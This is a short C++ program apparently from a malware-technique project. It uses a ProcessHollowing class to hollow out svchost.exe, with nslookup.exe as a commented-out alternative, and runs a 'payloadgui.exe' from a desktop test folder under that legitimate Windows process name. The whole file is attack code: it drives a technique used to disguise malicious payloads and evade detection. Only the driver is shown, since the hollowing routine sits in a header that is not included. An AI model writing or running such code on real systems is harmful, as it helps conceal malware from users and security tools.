#include "ProcessHollowing.hpp"
#include <string>
#include <iostream>

int main(int argc, char* argv[])
{
    ProcessHollowing a("C:\\Windows\\System32\\svchost.exe",
        "C:\\Users\\User\\Desktop\\Testings\\payloadgui.exe");

    /* ProcessHollowing a("C:\\Windows\\SysWOW64\\nslookup.exe",
        "C:\\Users\\User\\Desktop\\Testings\\payloadgui32new.exe"); */
    
    a.hollow();

    return 0;
}